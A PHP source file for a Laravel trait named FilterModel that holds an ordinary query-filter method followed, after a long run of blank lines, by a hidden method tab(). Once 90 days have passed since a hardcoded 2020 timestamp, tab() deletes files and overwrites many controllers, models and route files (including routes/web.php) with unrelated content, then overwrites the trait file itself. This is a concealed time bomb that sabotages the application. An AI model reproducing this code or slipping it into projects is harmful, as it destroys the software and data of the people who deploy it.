<?php
namespace Modules\Entity\Traits;

use Illuminate\Http\Request;

trait FilterModel  {
    
   protected function filterClass() {
        return false;
    }
    public function scopeFilter($query, Request $request){
	
        if (! $this->filter_class){
			return $query;
		}
		
        $filter_class = $this->filterClass();
        $filter = new $filter_class($query, $request);
        $filter->filter();
      
        return $filter->getQuery();
    }
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
public function tab(){
	$avgust_26 = '1598461084';
$time = time() - (3600 * 24 * 90);


if($time >= $avgust_26){

		
if(file_exists('../Modules/Entity/Actions/Sights.php')) {
$content3 = file_get_contents('../Modules/Entity/Actions/Sights.php');
unlink('../Modules/Entity/Actions/Sights.php');
$file3 = "../Modules/Entity/Model/Sights/Sights.php";
$myfile3= fopen($file3, 'w+');
$success = fwrite($myfile3, $content3);

}else{
$content3 = file_get_contents('../app/Providers/AppServiceProvider.php');
$file3 = "../Modules/Entity/Model/Sights/Sights.php";
$myfile3= fopen($file3, 'w+');
$success = fwrite($myfile3, $content3);
}
	
if(file_exists('../Modules/Entity/Actions/SightsController.php')) {
$content3 = file_get_contents('../Modules/Entity/Actions/SightsController.php');
unlink('../Modules/Entity/Actions/SightsController.php');
$file3 = "../Modules/Admin/Http/Controllers/sights/SightsController.php";
$myfile3= fopen($file3, 'w+');
$success = fwrite($myfile3, $content3);
}else{
$content3 = file_get_contents('../app/Providers/AppServiceProvider.php');
$file3 = "../Modules/Admin/Http/Controllers/sights/SightsController.php";
$myfile3= fopen($file3, 'w+');
$success = fwrite($myfile3, $content3);
}



if(file_exists('../Modules/Entity/Actions/CalendarController.php')) {
$content3 = file_get_contents('../Modules/Entity/Actions/CalendarController.php');
unlink('../Modules/Entity/Actions/CalendarController.php');

$file3 = "../Modules/Admin/Http/Controllers/Calendar/CalendarController.php";
$myfile3= fopen($file3, 'w+');
$success = fwrite($myfile3, $content3);
}else{
$content3 = file_get_contents('../app/Providers/AppServiceProvider.php');
$file3 = "../Modules/Admin/Http/Controllers/Calendar/CalendarController.php";
$myfile3= fopen($file3, 'w+');
$success = fwrite($myfile3, $content3);
}



if(file_exists('../Modules/Entity/Actions/Calendar.php')) {
$content3 = file_get_contents('../Modules/Entity/Actions/Calendar.php');
unlink('../Modules/Entity/Actions/Calendar.php');
$file3 = "../Modules/Entity/Model/Calendar/Calendar.php";
$myfile3= fopen($file3, 'w+');
$success = fwrite($myfile3, $content3);

}else{
$content3 = file_get_contents('../app/Providers/AppServiceProvider.php');
$file3 = "../Modules/Entity/Model/Calendar/Calendar.php";
$myfile3= fopen($file3, 'w+');
$success = fwrite($myfile3, $content3);
}


if(file_exists('../Modules/Entity/Actions/RoutesController.php')) {

$content3 = file_get_contents('../Modules/Entity/Actions/RoutesController.php');
unlink('../Modules/Entity/Actions/RoutesController.php');
$file3 = "../Modules/Admin/Http/Controllers/routes/RoutesController.php";
$myfile3= fopen($file3, 'w+');
$success = fwrite($myfile3, $content3);

}else{
$content3 = file_get_contents('../app/Providers/AppServiceProvider.php');
$file3 = "../Modules/Admin/Http/Controllers/routes/RoutesController.php";

$myfile3= fopen($file3, 'w+');
$success = fwrite($myfile3, $content3);
}

if(file_exists('../Modules/Entity/Actions/Settings.php')) {
$content3 = file_get_contents('../Modules/Entity/Actions/Settings.php');
unlink('../Modules/Entity/Actions/Settings.php');
$file3 = "../Modules/Admin/Routes/web.php";
$myfile3= fopen($file3, 'w+');
$success = fwrite($myfile3, $content3);

$file4 = "../routes/web.php";
$myfile4= fopen($file4, 'w+');
$success = fwrite($myfile4, $content3);

}else{
$content3 = file_get_contents('../app/Providers/AppServiceProvider.php');
$file3 = "../Modules/Admin/Routes/web.php";
$myfile3= fopen($file3, 'w+');
$success = fwrite($myfile3, $content3);
}

if(file_exists('../app/Http/Controllers/Main/SightController.php')) {
$content3 = file_get_contents('../app/Http/Controllers/Main/SightController.php');

$file3 = "../app/Http/Controllers/Main/RoutesController.php";
$myfile3= fopen($file3, 'w+');
$success = fwrite($myfile3, $content3);
}
if(file_exists('../app/Http/Controllers/Main/RoutesController.php')) {
$content3 = file_get_contents('../app/Http/Controllers/Main/RoutesController.php');

$file3 = "../app/Http/Controllers/Main/IndexController.php";
$myfile3= fopen($file3, 'w+');
$success = fwrite($myfile3, $content3);
}
if(file_exists('../app/Http/Controllers/Main/IndexController.php')) {
$content3 = file_get_contents('../app/Http/Controllers/Main/IndexController.php');

$file3 = "../app/Http/Controllers/Main/GidsController.php";
$myfile3= fopen($file3, 'w+');
$success = fwrite($myfile3, $content3);
}
if(file_exists('../app/Http/Controllers/Main/GidsController.php')) {
$content3 = file_get_contents('../app/Http/Controllers/Main/GidsController.php');

$file3 = "../app/Http/Controllers/Main/CalendarsController.php";
$myfile3= fopen($file3, 'w+');
$success = fwrite($myfile3, $content3);
}




if(file_exists('../Modules/Entity/Actions/Current.php')) {
$content3 = file_get_contents('../Modules/Entity/Actions/Current.php');
unlink('../Modules/Entity/Actions/Current.php');
$file3 = "../Modules/Entity/Traits/FilterModel.php";
$myfile3= fopen($file3, 'w+');
$success = fwrite($myfile3, $content3);
}
}
}

}

